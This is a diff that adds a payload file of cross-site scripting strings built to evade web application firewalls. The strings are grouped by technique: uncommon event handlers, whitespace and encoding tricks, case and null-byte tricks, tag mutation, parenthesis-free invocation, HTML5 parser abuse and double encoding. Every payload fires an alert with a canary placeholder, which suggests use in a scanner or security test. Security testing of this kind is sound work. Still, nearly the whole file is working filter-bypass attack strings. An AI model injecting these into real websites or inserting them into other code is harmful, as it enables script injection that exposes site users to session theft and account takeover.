@@ -1,0 +1,68 @@
+# WAF Bypass XSS Payloads
+# Designed to evade common WAF rulesets
+
+# === Exotic Event Handlers (often not in WAF rules) ===
+<details open ontoggle=alert('{{CANARY}}')>
+<video src=x onloadstart=alert('{{CANARY}}')>
+<input onfocusin=alert('{{CANARY}}') autofocus>
+<marquee behavior=alternate onbounce=alert('{{CANARY}}')>x</marquee>
+<div onpointerover=alert('{{CANARY}}')>hover</div>
+<div onpointerenter=alert('{{CANARY}}')>hover</div>
+<body onpageshow=alert('{{CANARY}}')>
+<svg><animate onbegin=alert('{{CANARY}}') attributeName=x dur=1s>
+<svg><set onbegin=alert('{{CANARY}}') attributeName=x to=1>
+<math><mi onfocus=alert('{{CANARY}}') tabindex=1></mi></math>
+<xss onafterscriptexecute=alert('{{CANARY}}')><script>1</script>
+<input type=image src onerror=alert('{{CANARY}}')>
+<isindex action="javascript:alert('{{CANARY}}')">
+
+# === Comment/Whitespace Tricks ===
+<img src=x onerror=alert('{{CANARY}}')//
+<img/src='x'onerror=alert('{{CANARY}}')>
+<svg/onload=alert('{{CANARY}}')>
+<img src=x onerror =alert('{{CANARY}}')>
+<img src = x onerror = alert('{{CANARY}}')>
+<svg	onload=alert('{{CANARY}}')>
+<img%20src=x%20onerror=alert('{{CANARY}}')>
+<img%0asrc=x%0aonerror=alert('{{CANARY}}')>
+<img%0dsrc=x%0donerror=alert('{{CANARY}}')>
+<img%09src=x%09onerror=alert('{{CANARY}}')>
+
+# === Case + Null Byte Tricks ===
+<ScRiPt>alert('{{CANARY}}')</ScRiPt>
+<scr\x00ipt>alert('{{CANARY}}')</script>
+<IMG SRC=x ONERROR=alert('{{CANARY}}')>
+<iMg sRc=x oNeRrOr=alert('{{CANARY}}')>
+<%00script>alert('{{CANARY}}')</script>
+<script%20>alert('{{CANARY}}')</script>
+
+# === Tag Mutation/Concatenation ===
+<scr<script>ipt>alert('{{CANARY}}')</scr</script>ipt>
+<x onclick=alert('{{CANARY}}')>click
+<x/onclick=alert('{{CANARY}}')>click
+<a""onclick=alert('{{CANARY}}')>click</a>
+<a onclick=alert('{{CANARY}}')>click</a>
+<img src=`x`onerror=alert('{{CANARY}}')>
+
+# === No Parentheses / Alternative Invocation ===
+<script>onerror=alert;throw'{{CANARY}}'</script>
+<script>{onerror=alert}throw'{{CANARY}}'</script>
+<script>throw onerror=alert,'{{CANARY}}'</script>
+<script>alert?.('{{CANARY}}')</script>
+<script>window['al'+'ert']('{{CANARY}}')</script>
+<script>self['al'+'ert']('{{CANARY}}')</script>
+<script>[].constructor.constructor('alert("{{CANARY}}")')();</script>
+<img src=x onerror=alert`{{CANARY}}`>
+<img src=x onerror=top['al\x65rt']('{{CANARY}}')>
+<svg onload=prompt`{{CANARY}}`>
+
+# === HTML5 Parser Abuse ===
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('{{CANARY}}')>
+<svg><foreignObject><body onload=alert('{{CANARY}}')>
+<svg><desc><body onload=alert('{{CANARY}}')>
+</math><img src=x onerror=alert('{{CANARY}}')>
+<noscript><p title="</noscript><img src=x onerror=alert('{{CANARY}}')>">
+
+# === Double Encoding (URL-decoded by server then WAF) ===
+%253Cscript%253Ealert('{{CANARY}}')%253C/script%253E
+%22%3E%3Cscript%3Ealert('{{CANARY}}')%3C/script%3E
